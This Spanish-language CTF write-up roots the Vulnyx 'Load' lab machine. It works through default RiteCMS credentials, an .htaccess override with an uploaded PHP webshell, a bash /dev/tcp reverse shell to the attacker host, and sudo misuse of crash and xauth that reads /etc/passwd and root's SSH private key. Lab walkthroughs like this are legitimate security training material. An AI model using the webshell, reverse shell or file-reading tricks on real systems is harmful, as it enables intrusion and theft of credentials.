---
title: Vulnyx - Load
author: estx
date: 2024-04-28 16:41:00 +0800
categories: [Writeup, Vulnyx, Easy]
tags: [Linux, 'Rite CMS', 'File Upload', 'Information Leakage']
math: true
mermaid: true
image:
  path: /assets/images/Vulnyx/Easy/Load/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hook Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnyx.

Técnicas usadas: **Rite CMS, File Upload, Information Leakage**


### Fase de Reconocimiento 🧣

Como primer punto, identificamos la dirección IP de la **`Máquina Vulnyx`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.68	08:00:27:c6:4f:1d	PCS Systemtechnik GmbH
```


a. Enumeramos los puertos que están abiertos.

```bash
❯ nmap -p- -sS --min-rate 5000 -Pn -n 192.168.100.68 -oG ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:7D:6A:F0 (Oracle VirtualBox virtual NIC)
```

b. Vemos las versiones de los servicios que se están ejecutando

```bash
❯ nmap -p22,80 -sCV -oN versions 192.168.100.68

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/ritedev/
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:7D:6A:F0 (Oracle VirtualBox virtual NIC)
```

c. Existe un directorio `/ritedev` en el que haremos un **fuzzing de directorios y archivos** para encontrar más recursos

```bash
❯ dirsearch -u 'http://192.168.100.68/ritedev/' 

[01:15:08] 200 -  559B  - /ritedev/admin.php
[01:15:15] 200 -    4B  - /ritedev/cms/
[01:15:18] 200 -    6B  - /ritedev/files/
[01:15:23] 403 -  279B  - /ritedev/media/
```


* Si nos vamos a `/admin.php` necesitaremos credenciales, en este caso, el sistema tiene las credenciales por defecto **`admin:admin`** [Credenciales RiteCMS](https://github.com/handylulu/RiteCMS). Una vez que nos autentiquemos veremos secciones en las cuales podemos subir archivos o imágenes. Al investigar por un forma de explotación llegamos a [RiteCMS Remote Code Execution](https://www.exploit-db.com/exploits/50616)

d. Cambiaremos las reglas del archivos **`.htaccess`** con el fin de subir un archivo php y ejecutar comandos

* **.htaccess**

    ```txt
    <Files *.php>
        deny from all
    </Files>

    <Files ~ "webshell\.php$">
        Allow from all
    </Files>
    ```

* **webshell.php**

    ```php
    <?php
        system($_GET['cmd']);
    ?>
    ```


* En el apartado de 'files'

    ![Files](/assets/images/Vulnyx/Easy/Load/01-files.png)


Subiremos nuestro archivo **.htaccess** (Sobreescribiendo al anterior) y al archivo webshell.php

e. Una vez realizado esto podremos ejecutar comandos

```bash
❯ curl -s -X GET 'http://192.168.100.68/ritedev/files/webshell.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

* Nos entablaremos una reverse shell

    ```bash
    ❯ curl -s -X GET 'http://192.168.100.68/ritedev/files/webshell.php?cmd=bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/192.168.100.55/4445%200>%261"'
    -------------------------------------------------
    ❯ nc -lvnp 4445
    www-data@load:/var/www/html/ritedev/files$ 
    ```


    > El payload indicado se debe URLencodear, por eso en vez de 'espacios' vemos **%20**, y en vez de '&' vemos **%26**
    {: .prompt-info }


### Escalada de Privilegios 💹


a. Ahora realizamos un tratamiento de la TTY en la reverse shell

    ```bash
    www-data@load:/var/www/html/ritedev/files$ script /dev/null -c bash
    script /dev/null -c bash
    Script started, output log file is '/dev/null'.
    www-data@load:/var/www/html/ritedev/files$ ^Z
    [1]  + 63970 suspended  nc -lvnp 4445
    ❯ stty raw -echo;fg
    [1]  + 63970 continued  nc -lvnp 4445
                                        reset xterm


    www-data@load:/var/www/html/ritedev/files$ export TERM=xterm-256color
    www-data@load:/var/www/html/ritedev/files$ source /etc/skel/.bashrc 
    ```

b. Al listar los privilegios a nivel de sudoers de este usuario vemos que podemos ejecutar **`crash`** como el usuario travis

```bash
www-data@load:/var/www/html/ritedev/files$ sudo -l

User www-data may run the following commands on load:
    (travis) NOPASSWD: /usr/bin/crash
```

* Si investigamos en [GTOFBins](https://gtfobins.github.io/gtfobins/crash/), existe una forma de escalar privilegios

```bash
www-data@load:/var/www/html/ritedev/files$ sudo -u travis /usr/bin/crash -h
```

* Se nos abrirá una ventana con la información del usuario del programa, en este punto tecleamos `!/bin/bash`

c. Ya como el usuario **travis** veremos que podemos ejecutar `xauth` como el usuario root

```bash
travis@load:/var/www/html/ritedev/files$ sudo -l 

User travis may run the following commands on load:
    (root) NOPASSWD: /usr/bin/xauth
```


* Con xauth podemos leer un archivo en el cual se indiquen comando válidos para el comando, pero, en caso de que esta lectura encuentre comandos no válidos, lo vemos por pantalla

```bash
travis@load:/var/www/html/ritedev/files$ sudo -u root /usr/bin/xauth source /etc/passwd
/usr/bin/xauth:  file /root/.Xauthority does not exist
/usr/bin/xauth: /etc/passwd:1:  unknown command "root:x:0:0:root:/root:/bin/bash"
/usr/bin/xauth: /etc/passwd:2:  unknown command "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
/usr/bin/xauth: /etc/passwd:3:  unknown command "bin:x:2:2:bin:/bin:/usr/sbin/nologin"
<SNIP>
```

d. Con lo anterior en mente, podemos leer cualquier archivo y como el servicio SSH estaba abierto, podemos intuir que el usuario root tiene una clave id_rsa

```bash
travis@load:/var/www/html/ritedev/files$ sudo -u root /usr/bin/xauth source /root/.ssh/id_rsa
/usr/bin/xauth:  file /root/.Xauthority does not exist
/usr/bin/xauth: /root/.ssh/id_rsa:1:  unknown command "-----BEGIN"
/usr/bin/xauth: /root/.ssh/id_rsa:2:  unknown command "MIIEpAIBAAKCAQEAn1xk2mDBXCTen7d97aY7rEVweRUsVE5Zl4sGPG/yXLAAuodz"
/usr/bin/xauth: /root/.ssh/id_rsa:3:  unknown command "xjGuAqvTRhG4omhxiJeDr9taOePsIaUGI3Q/qBqUsbnuM/86vu/ANM6+Olzt80fc"
/usr/bin/xauth: /root/.ssh/id_rsa:4:  unknown command "Cv1QVKIdFOweMAiXskvQEV7Fw3qha7fFbf/D8L7BCgXrT70/p9jf4FBroC9pFsRy"
<SNIP>
/usr/bin/xauth: /root/.ssh/id_rsa:27:  unknown command "-----END"
```

* Copiamos la clave id_rsa y la completamos

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAn1xk2mDBXCTen7d97aY7rEVweRUsVE5Zl4sGPG/yXLAAuodz
<SNIP>
JAavd3wkMRXHLIOQtOiV9z3F2PmbO3h6yR6esFl0tGcnfZYmaiZJN/MLZKpL9WI/
WuTyDRk99zQu4GNenQiUDmxYCuOuX5kggXaakAN98THXncO38BAAiA==
-----END RSA PRIVATE KEY-----
```


> Se completó los delimitadores de la clave id_rsa `-----BEGIN RSA PRIVATE KEY-----` y `-----END RSA PRIVATE KEY-----`. En otros casos puede que sea **OPENSSH** y no **RSA**
{: .prompt-info }

c. Le damos el permido **`600`** a la clave id_rsa y nos podremos conectar como **root** en el sistema

```bash
❯ chmod 600 id_rsa
❯ ssh root@192.168.100.68 -i id_rsa
root@load:~# cat /root/.roooooooooooooooooooooooooooooooooooot.txt 
85ed9306438d8302cbb4dcbc7c5491b3
```
